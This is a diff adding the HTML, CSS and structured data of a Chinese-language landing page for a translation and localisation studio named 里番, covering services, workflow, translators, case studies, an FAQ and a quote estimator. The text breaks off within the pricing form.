@@ -1,0 +1,736 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<meta name="renderer" content="webkit">
+<meta name="theme-color" content="#0f3d3e">
+<meta name="description" content="里番｜专注中文母语级翻译与本地化服务。覆盖法律、医疗、机械工程、字幕游戏等 30+ 语种，10 年译员团队，逐句校对、交付可追责。">
+<meta name="keywords" content="里番, 里番翻译, 里番本地化, 中文翻译, 专业翻译, 字幕翻译, 法律翻译, 医学翻译, 技术翻译, 多语种本地化, 里番翻译官网">
+<meta name="author" content="里番翻译工作室">
+<meta name="robots" content="index,follow,max-image-preview:large">
+<meta name="bingbot" content="index,follow">
+<link rel="canonical" href="https://lifan-h5.github.io/">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>里</text></svg>">
+
+<!-- Open Graph / Twitter -->
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="里番翻译">
+<meta property="og:title" content="里番｜专业翻译与本地化服务">
+<meta property="og:description" content="中文母语级翻译，30+ 语种，10 年译员团队，逐句校对交付可追责。">
+<meta property="og:url" content="https://lifan-h5.github.io/">
+<meta property="og:locale" content="zh_CN">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="里番｜专业翻译与本地化服务">
+<meta name="twitter:description" content="中文母语级翻译，30+ 语种，10 年译员团队。">
+
+<!-- 结构化数据：组织 + 服务 + 面包屑 -->
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@graph": [
+    {
+      "@type": "Organization",
+      "@id": "https://lifan-h5.github.io/#organization",
+      "name": "里番翻译",
+      "alternateName": ["里番", "里番本地化"],
+      "url": "https://lifan-h5.github.io/",
+      "logo": "https://lifan-h5.github.io/#logo",
+      "description": "专注中文母语级翻译与本地化服务的专业工作室",
+      "slogan": "把每一种语言，都译成本地人会说的话",
+      "areaServed": "CN",
+      "knowsLanguage": ["zh-CN", "en", "ja", "ko", "de", "fr", "es", "ru"]
+    },
+    {
+      "@type": "ProfessionalService",
+      "@id": "https://lifan-h5.github.io/#service",
+      "name": "里番翻译服务",
+      "provider": { "@id": "https://lifan-h5.github.io/#organization" },
+      "serviceType": "翻译与本地化",
+      "areaServed": "CN",
+      "hasOfferCatalog": {
+        "@type": "OfferCatalog",
+        "name": "里番翻译服务目录",
+        "itemListElement": [
+          { "@type": "Offer", "itemOffered": { "@type": "Service", "name": "法律翻译" } },
+          { "@type": "Offer", "itemOffered": { "@type": "Service", "name": "医学翻译" } },
+          { "@type": "Offer", "itemOffered": { "@type": "Service", "name": "工程技术翻译" } },
+          { "@type": "Offer", "itemOffered": { "@type": "Service", "name": "字幕与游戏本地化" } }
+        ]
+      }
+    },
+    {
+      "@type": "BreadcrumbList",
+      "itemListElement": [
+        { "@type": "ListItem", "position": 1, "name": "首页", "item": "https://lifan-h5.github.io/#top" },
+        { "@type": "ListItem", "position": 2, "name": "翻译服务", "item": "https://lifan-h5.github.io/#services" },
+        { "@type": "ListItem", "position": 3, "name": "服务流程", "item": "https://lifan-h5.github.io/#process" },
+        { "@type": "ListItem", "position": 4, "name": "译员团队", "item": "https://lifan-h5.github.io/#team" },
+        { "@type": "ListItem", "position": 5, "name": "案例与报价", "item": "https://lifan-h5.github.io/#cases" },
+        { "@type": "ListItem", "position": 6, "name": "关于里番", "item": "https://lifan-h5.github.io/#about" }
+      ]
+    }
+  ]
+}
+</script>
+
+<title>里番｜专业翻译与本地化服务 - 里番翻译官网</title>
+
+<style>
+/* ============ 设计令牌 ============ */
+:root{
+  --ink:#12201f; --ink-2:#3d4b49; --muted:#6b7a77;
+  --paper:#f6f3ec; --paper-2:#efe9dd; --card:#ffffff;
+  --brand:#0f4c4a; --brand-2:#126e69; --brand-soft:#e2efed;
+  --accent:#c2672f; --accent-soft:#fbeede;
+  --line:rgba(18,32,31,.10);
+  --shadow:0 1px 2px rgba(18,32,31,.05),0 12px 32px -16px rgba(18,32,31,.28);
+  --r:18px;
+  --max:1160px;
+  --t:.42s cubic-bezier(.2,.7,.3,1);
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{
+  font-family:"PingFang SC","Hiragino Sans GB","Microsoft YaHei",-apple-system,"Helvetica Neue",Arial,sans-serif;
+  background:var(--paper); color:var(--ink); line-height:1.75; font-size:clamp(15px,1vw+12px,17px);
+  -webkit-font-smoothing:antialiased; overflow-x:hidden;
+}
+img,svg{max-width:100%;display:block}
+a{color:inherit;text-decoration:none}
+button{font:inherit;cursor:pointer;border:0;background:none;color:inherit}
+h1,h2,h3,h4{line-height:1.28;font-weight:700;letter-spacing:-.01em;color:var(--ink)}
+:focus-visible{outline:3px solid var(--accent);outline-offset:3px;border-radius:6px}
+::selection{background:var(--brand);color:#fff}
+
+.wrap{width:min(100% - 2rem,var(--max));margin-inline:auto}
+@media(min-width:768px){.wrap{width:min(100% - 3rem,var(--max))}}
+
+/* ============ 顶部导航 ============ */
+.hd{position:sticky;top:0;z-index:60;background:rgba(246,243,236,.86);backdrop-filter:blur(14px);
+  border-bottom:1px solid transparent;transition:box-shadow var(--t),border-color var(--t)}
+.hd.solid{box-shadow:0 2px 18px -10px rgba(18,32,31,.35);border-bottom-color:var(--line)}
+.nav{display:flex;align-items:center;gap:1rem;height:64px}
+.logo{display:flex;align-items:baseline;gap:.35rem;font-weight:800;letter-spacing:.02em}
+.logo b{font-size:1.45rem;color:var(--brand)}
+.logo span{font-size:.78rem;color:var(--muted);font-weight:500;white-space:nowrap}
+.navlinks{display:none;gap:.25rem;margin-left:auto}
+.navlinks a{padding:.5rem .85rem;border-radius:999px;font-size:.93rem;color:var(--ink-2);transition:all var(--t)}
+.navlinks a:hover{background:var(--brand-soft);color:var(--brand-2)}
+.cta-head{margin-left:auto;display:none}
+.btn{display:inline-flex;align-items:center;gap:.5rem;padding:.72rem 1.3rem;border-radius:999px;
+  font-weight:600;font-size:.93rem;transition:transform var(--t),box-shadow var(--t),background var(--t)}
+.btn-primary{background:var(--brand);color:#fff;box-shadow:0 8px 22px -10px rgba(15,76,74,.75)}
+.btn-primary:hover{background:var(--brand-2);transform:translateY(-2px)}
+.btn-ghost{border:1px solid var(--line);background:#fff}
+.btn-ghost:hover{border-color:var(--brand);color:var(--brand)}
+.menu-btn{margin-left:auto;width:44px;height:44px;border-radius:12px;display:grid;place-items:center;border:1px solid var(--line)}
+.menu-btn span{display:block;width:20px;height:2px;background:var(--ink);position:relative}
+.menu-btn span::before,.menu-btn span::after{content:"";position:absolute;left:0;width:20px;height:2px;background:var(--ink)}
+.menu-btn span::before{top:-6px}.menu-btn span::after{top:6px}
+@media(min-width:900px){
+  .navlinks,.cta-head{display:flex;align-items:center}
+  .menu-btn{display:none}
+}
+.mmenu{position:fixed;inset:64px 0 0 0;background:var(--paper);z-index:55;
+  display:flex;flex-direction:column;padding:1.25rem;gap:.25rem;
+  transform:translateX(100%);transition:transform var(--t);}
+.mmenu.open{transform:translateX(0)}
+.mmenu a{padding:1rem;border-radius:14px;font-size:1.1rem;border-bottom:1px solid var(--line)}
+.mmenu a:active{background:var(--brand-soft)}
+
+/* ============ 首屏 ============ */
+.hero{padding:clamp(2.5rem,8vw,5.5rem) 0 clamp(2rem,6vw,4rem);position:relative;overflow:hidden}
+.hero::after{content:"";position:absolute;right:-12vw;top:-10vw;width:55vw;height:55vw;border-radius:50%;
+  background:radial-gradient(circle,rgba(194,103,47,.16),transparent 65%);z-index:0}
+.hero-in{position:relative;z-index:1;display:grid;gap:clamp(1.5rem,4vw,2.5rem)}
+@media(min-width:920px){.hero-in{grid-template-columns:1.15fr .85fr;align-items:center}}
+.eyebrow{display:inline-flex;align-items:center;gap:.5rem;width:fit-content;padding:.4rem .9rem;
+  border-radius:999px;background:var(--brand-soft);color:var(--brand-2);font-size:.84rem;font-weight:600}
+.eyebrow i{width:6px;height:6px;border-radius:50%;background:var(--accent);display:inline-block}
+h1{font-size:clamp(2.1rem,6vw,3.75rem);margin:.9rem 0 1.1rem}
+h1 em{font-style:normal;color:var(--brand);position:relative;white-space:nowrap}
+h1 em::after{content:"";position:absolute;left:0;right:0;bottom:.06em;height:.22em;background:var(--accent-soft);z-index:-1}
+.lede{font-size:clamp(1rem,1.4vw,1.15rem);color:var(--ink-2);max-width:34em}
+.stats{display:grid;grid-template-columns:repeat(3,1fr);gap:1rem;margin:2rem 0 2.25rem;
+  padding:1.25rem;border-radius:var(--r);background:#fff;border:1px solid var(--line)}
+.stat b{display:block;font-size:clamp(1.5rem,3.5vw,2.1rem);color:var(--brand);line-height:1.1}
+.stat small{color:var(--muted);font-size:.82rem}
+.hero-actions{display:flex;flex-wrap:wrap;gap:.75rem}
+.hero-card{background:var(--brand);color:#fff;border-radius:24px;padding:clamp(1.5rem,3vw,2.25rem);
+  box-shadow:var(--shadow);position:relative;overflow:hidden}
+.hero-card::before{content:"";position:absolute;left:-30px;top:-40px;width:140px;height:140px;
+  border-radius:50%;background:rgba(255,255,255,.07)}
+.hc-title{font-size:1.05rem;color:rgba(255,255,255,.78);margin-bottom:1rem}
+.lang-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:.5rem;position:relative}
+.lang-grid div{padding:.7rem .4rem;text-align:center;border-radius:12px;background:rgba(255,255,255,.11);
+  font-size:.9rem;transition:background var(--t)}
+.lang-grid div:hover{background:rgba(255,255,255,.22)}
+.hero-card .btn{margin-top:1.5rem;width:100%;justify-content:center;background:#fff;color:var(--brand)}
+
+/* ============ 通用区块 ============ */
+section{padding:clamp(3rem,8vw,5.5rem) 0;scroll-margin-top:70px}
+.sec-head{text-align:center;max-width:38em;margin:0 auto clamp(2rem,5vw,3rem)}
+.kicker{font-size:.82rem;letter-spacing:.16em;color:var(--accent);font-weight:600;text-transform:uppercase}
+h2{font-size:clamp(1.6rem,4vw,2.5rem);margin:.5rem 0 .9rem}
+.sec-desc{color:var(--muted);font-size:1rem}
+
+/* 服务卡片 */
+.grid-svc{display:grid;gap:1rem}
+@media(min-width:640px){.grid-svc{grid-template-columns:repeat(2,1fr)}}
+@media(min-width:1000px){.grid-svc{grid-template-columns:repeat(3,1fr)}}
+.svc{background:var(--card);border:1px solid var(--line);border-radius:var(--r);padding:1.75rem 1.5rem;
+  transition:transform var(--t),box-shadow var(--t),border-color var(--t);position:relative;overflow:hidden}
+.svc:hover{transform:translateY(-6px);box-shadow:var(--shadow);border-color:rgba(15,76,74,.25)}
+.svc::after{content:"";position:absolute;left:0;top:0;width:100%;height:4px;background:var(--brand);transform:scaleX(0);transform-origin:left;transition:transform var(--t)}
+.svc:hover::after{transform:scaleX(1)}
+.svc-ic{width:52px;height:52px;border-radius:14px;background:var(--brand-soft);display:grid;place-items:center;margin-bottom:1.1rem;font-size:1.5rem}
+.svc h3{font-size:1.2rem;margin-bottom:.5rem}
+.svc p{color:var(--ink-2);font-size:.94rem}
+.svc ul{margin-top:1rem;padding-top:1rem;border-top:1px dashed var(--line);list-style:none;display:grid;gap:.4rem}
+.svc li{font-size:.86rem;color:var(--muted);padding-left:1.1rem;position:relative}
+.svc li::before{content:"";position:absolute;left:0;top:.55em;width:5px;height:5px;border-radius:50%;background:var(--accent)}
+
+/* 流程 */
+.steps{counter-reset:st;display:grid;gap:1rem}
+@media(min-width:720px){.steps{grid-template-columns:repeat(2,1fr)}}
+@media(min-width:1000px){.steps{grid-template-columns:repeat(4,1fr)}}
+.step{background:#fff;border:1px solid var(--line);border-radius:var(--r);padding:1.75rem 1.5rem;position:relative}
+.step::before{counter-increment:st;content:"0" counter(st);position:absolute;right:1.5rem;top:1.25rem;
+  font-size:2.6rem;font-weight:800;color:var(--paper-2);line-height:1}
+.step h3{font-size:1.1rem;margin-bottom:.5rem}
+.step p{color:var(--ink-2);font-size:.92rem}
+
+/* 团队 */
+.team{display:grid;gap:1rem}
+@media(min-width:640px){.team{grid-template-columns:repeat(2,1fr)}}
+@media(min-width:1000px){.team{grid-template-columns:repeat(4,1fr)}}
+.member{background:#fff;border:1px solid var(--line);border-radius:var(--r);padding:1.5rem;text-align:center}
+.ava{width:84px;height:84px;border-radius:50%;margin:0 auto 1rem;display:grid;place-items:center;
+  font-size:1.8rem;font-weight:700;color:var(--brand);background:var(--brand-soft)}
+.member h3{font-size:1.05rem}
+.member .role{color:var(--accent);font-size:.85rem;margin:.2rem 0 .7rem}
+.member p{font-size:.86rem;color:var(--muted)}
+
+/* 案例 */
+.case-tabs{display:flex;gap:.5rem;flex-wrap:wrap;justify-content:center;margin-bottom:2rem}
+.tab{padding:.55rem 1.2rem;border-radius:999px;font-size:.9rem;background:#fff;border:1px solid var(--line);transition:all var(--t)}
+.tab[aria-selected="true"]{background:var(--brand);color:#fff;border-color:var(--brand)}
+.cases{display:grid;gap:1rem}
+@media(min-width:760px){.cases{grid-template-columns:repeat(2,1fr)}}
+.case{background:#fff;border:1px solid var(--line);border-radius:var(--r);overflow:hidden;transition:transform var(--t),box-shadow var(--t)}
+.case:hover{transform:translateY(-4px);box-shadow:var(--shadow)}
+.case-thumb{height:120px;display:grid;place-items:center;color:#fff;font-size:1.1rem;font-weight:600}
+.case:nth-child(1) .case-thumb{background:linear-gradient(120deg,#0f4c4a,#1b7a74)}
+.case:nth-child(2) .case-thumb{background:linear-gradient(120deg,#2f5c6e,#4a8ca0)}
+.case:nth-child(3) .case-thumb{background:linear-gradient(120deg,#7a4a2f,#c2672f)}
+.case:nth-child(4) .case-thumb{background:linear-gradient(120deg,#4a4a52,#7a7a85)}
+.case-body{padding:1.4rem}
+.tag{display:inline-block;font-size:.76rem;padding:.2rem .7rem;border-radius:999px;background:var(--accent-soft);color:#9a4f1f;margin-bottom:.8rem}
+.case h3{font-size:1.1rem;margin-bottom:.5rem}
+.case p{font-size:.9rem;color:var(--muted)}
+
+/* 报价 */
+.price{display:grid;gap:1rem;align-items:start}
+@media(min-width:860px){.price{grid-template-columns:1.1fr .9fr}}
+.faq{display:grid;gap:.75rem}
+.faq details{background:#fff;border:1px solid var(--line);border-radius:14px;padding:0 1.25rem;transition:box-shadow var(--t)}
+.faq details[open]{box-shadow:var(--shadow)}
+.faq summary{padding:1.1rem 0;font-weight:600;cursor:pointer;list-style:none;position:relative;padding-right:2rem}
+.faq summary::-webkit-details-marker{display:none}
+.faq summary::after{content:"+";position:absolute;right:0;top:50%;transform:translateY(-50%);color:var(--brand);font-size:1.4rem}
+.faq details[open] summary::after{content:"−"}
+.faq details p{padding:0 0 1.1rem;color:var(--ink-2);font-size:.93rem}
+.quote-card{background:var(--ink);color:#fff;border-radius:24px;padding:clamp(1.5rem,3vw,2.25rem);box-shadow:var(--shadow)}
+.quote-card h3{color:#fff;font-size:1.3rem;margin-bottom:.4rem}
+.quote-card .sub{color:rgba(255,255,255,.65);font-size:.9rem;margin-bottom:1.5rem}
+.field{margin-bottom:1rem}
+.field label{display:block;font-size:.85rem;color:rgba(255,255,255,.7);margin-bottom:.4rem}
+.field select,.field input{width:100%;padding:.85rem 1rem;border-radius:12px;border:1px solid rgba(255,255,255,.18);
+  background:rgba(255,255,255,.08);color:#fff;font:inherit;font-size:.95rem}
+.field select:focus,.field input:focus{outline:none;border-color:var(--accent);background:rgba(255,255,255,.13)}
+.field option{color:#222}
+.quote-out{margin-top:1rem;padding:1.1rem;border-radius:14px;background:rgba(255,255,255,.08);font-size:1rem;min-height:4em;color:rgba(255,255,255,.9)}
+.quote-out b{color:#fff;font-size:1.35rem}
+
+/* 关于 + 联系方式 */
+.about{display:grid;gap:2rem;align-items:center}
+@media(min-width:880px){.about{grid-template-columns:1fr 1fr}}
+.features{display:grid;gap:.75rem}
+.feat{display:flex;gap:.9rem;align-items:flex-start;background:#fff;border:1px solid var(--line);border-radius:16px;padding:1.25rem}
+.feat .ic{flex:0 0 42px;height:42px;border-radius:11px;background:var(--brand-soft);color:var(--brand);
+  display:grid;place-items:center;font-size:1.2rem}
+.feat h3{font-size:1rem;margin-bottom:.2rem}
+.feat p{font-size:.88rem;color:var(--muted)}
+.contact{background:var(--brand);color:#fff;border-radius:24px;padding:clamp(1.75rem,4vw,2.75rem);box-shadow:var(--shadow)}
+.contact h2{color:#fff;font-size:clamp(1.5rem,3.5vw,2.1rem)}
+.contact .sec-desc{color:rgba(255,255,255,.72)}
+.ci{display:flex;gap:1rem;align-items:center;padding:1rem 0;border-bottom:1px solid rgba(255,255,255,.14)}
+.ci:last-child{border-bottom:0}
+.ci .ic{width:44px;height:44px;border-radius:12px;background:rgba(255,255,255,.13);display:grid;place-items:center;font-size:1.15rem;flex:0 0 44px}
+.ci b{font-size:.85rem;color:rgba(255,255,255,.68);font-weight:500;display:block}
+.ci span{font-size:1rem}
+.hours{margin-top:1.5rem;padding-top:1.5rem;border-top:1px solid rgba(255,255,255,.14);font-size:.9rem;color:rgba(255,255,255,.72)}
+
+/* CTA */
+.cta-band{background:var(--paper-2);border-radius:28px;padding:clamp(2rem,5vw,3.5rem);text-align:center;margin-bottom:clamp(3rem,7vw,5rem)}
+.cta-band h2{margin-bottom:.8rem}
+.cta-band p{color:var(--ink-2);max-width:32em;margin:0 auto 1.75rem}
+
+/* 页脚 */
+.ft{background:var(--ink);color:rgba(255,255,255,.72);padding:3rem 0 2rem}
+.ft-top{display:grid;gap:2rem}
+@media(min-width:760px){.ft-top{grid-template-columns:1.4fr 1fr 1fr 1fr}}
+.ft h4{color:#fff;font-size:1rem;margin-bottom:1rem}
+.ft-brand b{font-size:1.5rem;color:#fff}
+.ft-brand p{font-size:.9rem;margin:1rem 0;max-width:22em}
+.ft ul{list-style:none;display:grid;gap:.6rem}
+.ft a{font-size:.92rem;transition:color var(--t)}
+.ft a:hover{color:#fff}
+.ft-bot{border-top:1px solid rgba(255,255,255,.12);margin-top:2.5rem;padding-top:1.5rem;
+  display:flex;flex-wrap:wrap;gap:1rem;justify-content:space-between;font-size:.85rem;color:rgba(255,255,255,.5)}
+
+/* 回到顶部 */
+.top{position:fixed;right:1rem;bottom:1.25rem;width:46px;height:46px;border-radius:50%;background:var(--brand);color:#fff;
+  display:grid;place-items:center;box-shadow:0 8px 24px -8px rgba(15,76,74,.6);opacity:0;pointer-events:none;transition:all var(--t);z-index:50}
+.top.show{opacity:1;pointer-events:auto}
+
+@media print{
+  .hd,.mmenu,.top,.cta-band{display:none}
+  body{background:#fff}
+  section{page-break-inside:avoid}
+}
+@media(prefers-reduced-motion:reduce){
+  *{scroll-behavior:auto;transition:none!important}
+}
+</style>
+</head>
+<body id="top">
+
+<header class="hd" id="hd">
+  <div class="wrap nav">
+    <a href="#top" class="logo" aria-label="里番翻译首页"><b>里番</b><span>本地化工作室</span></a>
+    <nav class="navlinks" aria-label="主导航">
+      <a href="#services">翻译服务</a>
+      <a href="#process">服务流程</a>
+      <a href="#team">译员团队</a>
+      <a href="#cases">案例与报价</a>
+      <a href="#about">关于里番</a>
+    </nav>
+    <a href="#cases" class="btn btn-primary cta-head">获取报价</a>
+    <button class="menu-btn" id="menuBtn" aria-label="打开菜单" aria-expanded="false" aria-controls="mmenu"><span></span></button>
+  </div>
+</header>
+
+<div class="mmenu" id="mmenu" aria-hidden="true">
+  <a href="#services">翻译服务</a>
+  <a href="#process">服务流程</a>
+  <a href="#team">译员团队</a>
+  <a href="#cases">案例与报价</a>
+  <a href="#about">关于里番</a>
+  <a href="#cases" style="background:var(--brand);color:#fff;margin-top:.5rem">获取报价</a>
+</div>
+
+<main>
+
+  <!-- ========== 首页 / 品牌主张 ========== -->
+  <section class="hero" aria-labelledby="h1">
+    <div class="wrap hero-in">
+      <div>
+        <span class="eyebrow"><i></i> 中文母语级翻译 · 本地化交付</span>
+        <h1 id="h1">把每一种语言，<br>都译成<em>本地人</em>会说的话</h1>
+        <p class="lede">里番专注中英日韩德法西俄等 30+ 语种的翻译与本地化，覆盖法律、医疗、工程技术、字幕与游戏。逐句校对、双人交叉审校，交付可追责。</p>
+        <div class="stats" role="list">
+          <div class="stat" role="listitem"><b>30+</b><small>支持语种</small></div>
+          <div class="stat" role="listitem"><b>10年</b><small>译员平均资历</small></div>
+          <div class="stat" role="listitem"><b>99.2%</b><small>一次验收通过</small></div>
+        </div>
+        <div class="hero-actions">
+          <a href="#cases" class="btn btn-primary">免费估算报价 →</a>
+          <a href="#process" class="btn btn-ghost">了解里番怎么做</a>
+        </div>
+      </div>
+      <aside class="hero-card" aria-label="覆盖语种">
+        <div class="hc-title">常译语种 · 母语校审</div>
+        <div class="lang-grid">
+          <div>英语 EN</div><div>日语 JA</div><div>韩语 KO</div>
+          <div>德语 DE</div><div>法语 FR</div><div>西班牙语 ES</div>
+          <div>俄语 RU</div><div>葡萄牙语 PT</div><div>意大利语 IT</div>
+          <div>泰语 TH</div><div>越南语 VI</div><div>阿拉伯语 AR</div>
+        </div>
+        <a href="#services" class="btn btn-primary">查看全部服务</a>
+      </aside>
+    </div>
+  </section>
+
+  <!-- ========== 翻译服务 ========== -->
+  <section id="services" aria-labelledby="s2">
+    <div class="wrap">
+      <div class="sec-head">
+        <div class="kicker">SERVICES</div>
+        <h2 id="s2">翻译服务</h2>
+        <p class="sec-desc">每个领域单独配对口译员，术语库随项目沉淀复用，第二次合作开始就能省一半沟通成本。</p>
+      </div>
+      <div class="grid-svc">
+        <article class="svc">
+          <div class="svc-ic">⚖️</div>
+          <h3>法律翻译</h3>
+          <p>合同、协议、诉讼材料、知识产权文书。严谨对应条款效力与法律术语，逐条核对，出件附译员签章与一致性说明。</p>
+          <ul><li>中英 / 中日双向</li><li>术语库 + 双语对照</li><li>可出具译员资质声明</li></ul>
+        </article>
+        <article class="svc">
+          <div class="svc-ic">🩺</div>
+          <h3>医学与生命科学翻译</h3>
+          <p>临床方案、知情同意书、药品说明书、医疗器械注册资料。按目标国法规术语规范处理，敏感信息全程脱敏。</p>
+          <ul><li>ICH / GCP 规范</li><li>术语一致性核查</li><li>病例数据脱敏流程</li></ul>
+        </article>
+        <article class="svc">
+          <div class="svc-ic">🏗️</div>
+          <h3>工程与技术翻译</h3>
+          <p>机械手册、电气图纸、CAD 标注、产品规格书。保留原格式排版，单位与型号零误差，可交付源文件。</p>
+          <ul><li>InDesign / FrameMaker 排版</li><li>图纸文字层处理</li><li>多语种同一术语库</li></ul>
+        </article>
+        <article class="svc">
+          <div class="svc-ic">🎬</div>
+          <h3>字幕与视频本地化</h3>
+          <p>影视剧、纪录片、课程、企业宣传片。按 CPS / 分行规则处理，含时间轴压制与硬字幕烧录。</p>
+          <ul><li>SRT / ASS / VTT 全格式</li><li>口型与时长适配</li><li>多语轨版本同包交付</li></ul>
+        </article>
+        <article class="svc">
+          <div class="svc-ic">🎮</div>
+          <h3>游戏与软件本地化</h3>
+          <p>UI 文案、角色对白、商店页面、客服知识库。考虑长度限制与文化梗，让翻译真正"落地"。</p>
+          <ul><li>字符串 + 伪翻译测试</li><li>文化适配与敏感词检查</li><li>PO / JSON / XML 直出</li></ul>
+        </article>
+        <article class="svc">
+          <div class="svc-ic">🌐</div>
+          <h3>网站与营销文案本地化</h3>
+          <p>官网、落地页、产品页、社媒内容。不止翻字面，重做信息层级与本地表达习惯，让文案能真正转化。</p>
+          <ul><li>SEO 关键词本地化</li><li>多语言版本同步</li><li>风格指南随项目沉淀</li></ul>
+        </article>
+      </div>
+    </div>
+  </section>
+
+  <!-- ========== 服务流程 ========== -->
+  <section id="process" style="background:#fff" aria-labelledby="s3">
+    <div class="wrap">
+      <div class="sec-head">
+        <div class="kicker">PROCESS</div>
+        <h2 id="s3">服务流程</h2>
+        <p class="sec-desc">从需求确认到最终交付，四步走完，中间每一步你都能看到进度、提出修改。</p>
+      </div>
+      <div class="steps">
+        <article class="step"><h3>需求确认</h3><p>发送文件与用途，30 分钟内回复可用语种、交期、报价与对应译员背景，无隐藏费用。</p></article>
+        <article class="step"><h3>翻译与术语对齐</h3><p>按领域匹配母语译员，建立专属术语表，先交样段确认风格再铺开全文。</p></article>
+        <article class="step"><h3>交叉校对</h3><p>第二译者独立通读，核对术语、数字、单位与格式，输出双语对照与修改记录。</p></article>
+        <article class="step"><h3>交付与质保</h3><p>按原格式排版交付，支持两轮免费修订，30 天内随时追加修改。</p></article>
+      </div>
+    </div>
+  </section>
+
+  <!-- ========== 译员团队 ========== -->
+  <section id="team" aria-labelledby="s4">
+    <div class="wrap">
+      <div class="sec-head">
+        <div class="kicker">TEAM</div>
+        <h2 id="s4">译员团队</h2>
+        <p class="sec-desc">不外包给陌生译员。团队全部实名考核、专业背景可查，每人只做自己领域的稿件。</p>
+      </div>
+      <div class="team">
+        <article class="member">
+          <div class="ava">林</div>
+          <h3>林译审</h3>
+          <div class="role">法律与合规</div>
+          <p>前律所涉外律师，CATTI 一级，10 年合同与诉讼文书经验。</p>
+        </article>
+        <article class="member">
+          <div class="ava">周</div>
+          <h3>周医学</h3>
+          <div class="role">医学与生命科学</div>
+          <p>医学英语硕士，参与多项国际多中心临床试验文档本地化。</p>
+        </article>
+        <article class="member">
+          <div class="ava">陈</div>
+          <h3>陈工程</h3>
+          <div class="role">机械与电气工程</div>
+          <p>机械工程背景，15 年技术手册翻译，熟悉 ISO / GB 术语体系。</p>
+        </article>
+        <article class="member">
+          <div class="ava">高</div>
+          <h3>高本地化</h3>
+          <div class="role">游戏与影视本地化</div>
+          <p>3A 游戏与影视字幕本地化 8 年，日韩英三语母语级表达。</p>
+        </article>
+      </div>
+    </div>
+  </section>
+
+  <!-- ========== 案例与报价 ========== -->
+  <section id="cases" style="background:#fff" aria-labelledby="s5">
+    <div class="wrap">
+      <div class="sec-head">
+        <div class="kicker">CASES</div>
+        <h2 id="s5">案例与报价</h2>
+        <p class="sec-desc">以下是可公开的代表性项目。报价按中文字数或源语单词数计算，预付 50% 即可开工。</p>
+      </div>
+
+      <div class="case-tabs" role="tablist">
+        <button class="tab" role="tab" aria-selected="true" data-cat="all">全部</button>
+        <button class="tab" role="tab" aria-selected="false" data-cat="law">法律</button>
+        <button class="tab" role="tab" aria-selected="false" data-cat="med">医学</button>
+        <button class="tab" role="tab" aria-selected="false" data-cat="game">本地化</button>
+        <button class="tab" role="tab" aria-selected="false" data-cat="tech">工程</button>
+      </div>
+
+      <div class="cases" id="caseGrid">
+        <article class="case" data-cat="law">
+          <div class="case-thumb">跨境并购协议</div>
+          <div class="case-body"><span class="tag">法律</span>
+            <h3>中英双向 4.2 万字并购协议</h3>
+            <p>10 个工作日交付，配套术语表与双语对照，客户一次性通过境外律师审核。</p>
+          </div>
+        </article>
+        <article class="case" data-cat="med">
+          <div class="case-thumb">Ⅲ期临床方案</div>
+          <div class="case-body"><span class="tag">医学</span>
+            <h3>多中心临床试验方案英译中</h3>
+            <p>三语术语库统一，6 万字 12 天交付，全程数据脱敏处理。</p>
+          </div>
+        </article>
+        <article class="case" data-cat="game">
+          <div class="case-thumb">独立游戏本地化</div>
+          <div class="case-body"><span class="tag">游戏本地化</span>
+            <h3>Steam 独立游戏日韩英三语</h3>
+            <p>8 万字符串，含商店页与文化梗适配，支持后续 DLC 追加翻译。</p>
+          </div>
+        </article>
+        <article class="case" data-cat="tech">
+          <div class="case-thumb">工程机械手册</div>
+          <div class="case-body"><span class="tag">工程技术</span>
+            <h3>设备操作手册英日俄三语</h3>
+            <p>保留原 InDesign 排版，图纸文字层逐条处理，型号单位零误差。</p>
+          </div>
+        </article>
+      </div>
+
+      <div class="price" style="margin-top:clamp(2.5rem,6vw,4rem)">
+        <div class="faq">
+          <div class="kicker" style="margin-bottom:.5rem">QUESTIONS</div>
+          <h2 style="text-align:left;font-size:clamp(1.4rem,3vw,1.9rem)">常见问题</h2>
+          <details open>
+            <summary>里番的报价是怎么算的？</summary>
+            <p>按中文字数或源语言单词数计费，分标准级、专业级、出版级三档。加急、排版、母语校审单独报价，一次性给全，无后续增项。</p>
+          </details>
+          <details>
+            <summary>交付周期一般多久？</summary>
+            <p>普通稿件约每工作日 2000–3000 中文字。加急可安排多人并行，最快次日交稿，具体以稿件难度与字数确认。</p>
+          </details>
+          <details>
+            <summary>保密怎么保证？</summary>
+            <p>可签署 NDA，文件传输走加密通道，项目结束可按需删除源文件与缓存，医学类数据全程脱敏处理。</p>
+          </details>
+          <details>
+            <summary>支持哪些文件格式？</summary>
+            <p>Word、Excel、PPT、PDF、InDesign、FrameMaker、JSON、PO、XML、SRT / ASS 等，可直接在原文件上处理保留格式。</p>
+          </details>
+        </div>
+
+        <form class="quote-card" id="quoteForm" novalidate>
+          <h3>自助估算</h3>
+          <p class="sub">选择语种与稿件类型，即可得到参考区间，最终以实际稿件为准。</p>
+          <div class="field">
+            <label for="qLang">目标语种</label>
+            <select id="qLang">
+              <option value="0.45">英语 English</option>
+              <option value="0.5">日语 日本語</option>
+              <option value="0.5">韩语 한국어</option>
+              <option value="0.55">德语 Deutsch</option>
+              <option value="0.55">法语 Français</option>
+              <option value="0.6">俄语 Русский</option>
+              <option value="0.65">阿拉伯语 العربية</option>
+            </select>
+          </div>
+          <div class="field">
+            <label for="qType">稿件类型</label>
+            <select id="qType">
+              <option value="1">通用级</option>
+              <option value="1.35">专业级（术语库 + 交叉校对）</option>
+              <option value="1.7">出版级（母语校审 + 排版）</option>
+            </select>
+          </div>
+          <div class="field">
+            <label for="qWords">中文字数（估算）</label>
+            <input type="number" id="qWords" inputmode="numeric" min="100" step="100" value="2000">
+          </div>
+          <div class="quote-out" id="qOut">参考价：<b>¥900 – ¥1,100</b> 起 · 交期约 <b>1–2 个工作日</b></div>
+          <button type="submit" class="btn btn-primary" style="width:100%;justify-content:center;margin-top:.75rem">确认需求并询价</button>
+        </form>
+      </div>
+    </div>
